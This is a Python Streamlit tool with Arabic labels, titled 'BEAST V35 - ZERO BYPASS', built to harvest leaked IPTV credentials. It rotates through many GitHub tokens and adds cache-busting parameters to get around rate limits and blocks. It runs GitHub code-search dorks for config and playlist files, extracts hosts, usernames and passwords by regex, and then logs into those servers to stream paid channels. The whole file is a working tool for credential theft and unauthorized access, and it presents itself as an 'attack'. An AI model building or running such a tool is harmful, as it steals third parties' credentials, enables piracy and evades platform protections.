import streamlit as st
import requests
import re
import time
import threading

# إعدادات الواجهة
st.set_page_config(page_title="BEAST V35 - ZERO BYPASS", layout="wide")

if "hits" not in st.session_state: st.session_state.hits = []
if "logs" not in st.session_state: st.session_state.logs = []
if "auth" not in st.session_state: st.session_state.auth = False

# نظام الدخول
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V35 - ZERO BYPASS</h1>", unsafe_allow_html=True)
    pwd = st.text_input("كلمة السر:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تصميم احترافي
st.markdown("""
<style>
    .stApp { background-color: #000; color: #fff; }
    .hit-card { background: #0d1117; border: 1px solid #00ff41; padding: 15px; border-radius: 8px; margin-bottom: 10px; }
    .log-box { background: #111; color: #00d4ff; padding: 10px; font-family: monospace; font-size: 11px; height: 150px; overflow-y: auto; border: 1px solid #333; }
</style>
""", unsafe_allow_html=True)

# --- المحرك القناص ---
def beast_scanner(tokens):
    # دروكات متنوعة جداً لكسر الحظر
    queries = [
        'extension:txt "get.php?username="',
        'extension:m3u8 "password=" "http"',
        'filename:config.php "db_user"',
        'extension:json "server_url"',
        'extension:m3u "player_api.php"'
    ]
    
    t_idx = 0
    for query in queries:
        for page in range(1, 20):
            try:
                current_token = tokens[t_idx % len(tokens)]
                headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
                
                # إضافة معلمة عشوائية للرابط لكسر الكاش والحظر
                search_url = f"https://api.github.com/search/code?q={query}&page={page}&per_page=100&s=indexed&cache_bust={time.time()}"
                res = requests.get(search_url, headers=headers)
                
                if res.status_code == 403:
                    st.session_state.logs.insert(0, f"⚠️ التوكن {t_idx+1} محظور مؤقتاً.. تبديل...")
                    t_idx += 1
                    continue
                
                data = res.json()
                if "items" not in data: continue

                for item in data['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    content = requests.get(raw_url, timeout=2).text
                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                    
                    for host, user, pw in matches:
                        hit = {"host": host, "user": user, "pw": pw}
                        if hit not in st.session_state.hits:
                            st.session_state.hits.insert(0, hit)
                            st.session_state.logs.insert(0, f"✅ تم العثور على: {host}")
            except:
                t_idx += 1
                continue

# --- الواجهة الرئيسية ---
col1, col2 = st.columns([1, 2])

with col1:
    st.header("⚙️ التحكم")
    t_input = st.text_area("أدخل التوكنات (كل واحد في سطر):", height=200)
    if st.button("🚀 بدء الهجوم العنيف"):
        t_list = [t.strip() for t in t_input.split('\n') if t.strip()]
        if t_list:
            st.session_state.hits = []
            threading.Thread(target=beast_scanner, args=(t_list,), daemon=True).start()
        else: st.error("أدخل التوكنات أولاً!")
    
    st.subheader("📝 سجل الأحداث")
    st.markdown(f'<div class="log-box">{"<br>".join(st.session_state.logs)}</div>', unsafe_allow_html=True)

with col2:
    st.header(f"📊 النتائج المباشرة: {len(st.session_state.hits)}")
    if not st.session_state.hits:
        st.warning("في انتظار النتائج... إذا طال الانتظار، فالتوكنات ضعيفة أو محظورة.")
    
    for h in st.session_state.hits:
        with st.container():
            st.markdown(f"""
            <div class="hit-card">
                <b>HOST:</b> <span style="color:#00ff41;">{h['host']}</span><br>
                <b>USER:</b> {h['user']} | <b>PASS:</b> {h['pw']}<br>
                <small style="color:#888;">URL: {h['host']}/get.php?username={h['user']}&password={h['pw']}&type=m3u_plus&output=ts</small>
            </div>
            """, unsafe_allow_html=True)
            if st.button(f"📺 تشغيل {h['host'][:20]}", key=h['host']+h['user']):
                st.session_state.target_srv = h

# --- مشغل إكستريم مدمج ---
if "target_srv" in st.session_state:
    st.divider()
    srv = st.session_state.target_srv
    st.subheader(f"🎬 مشغل BEAST للسيرفر: {srv['host']}")
    
    try:
        api_url = f"{srv['host']}/player_api.php?username={srv['user']}&password={srv['pw']}"
        # جلب القنوات
        channels = requests.get(f"{api_url}&action=get_live_streams", timeout=5).json()
        
        search_ch = st.text_input("🔍 بحث في القنوات (مثلاً: bein, ssc)...")
        
        c_list, c_vid = st.columns([1, 2])
        with c_list:
            for ch in channels[:100]: # عرض أول 100 قناة للسرعة
                if search_ch.lower() in ch['name'].lower():
                    if st.button(ch['name'], key=f"ch_{ch['stream_id']}", use_container_width=True):
                        st.session_state.video_url = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{ch['stream_id']}.ts"
        
        with c_vid:
            if "video_url" in st.session_state:
                st.video(st.session_state.video_url)
                st.code(st.session_state.video_url)
    except:
        st.error("فشل الاتصال بمشغل السيرفر. قد يكون السيرفر محمياً أو مغلقاً.")

# تحديث تلقائي لرؤية النتائج فور ظهورها
time.sleep(2)
st.rerun()
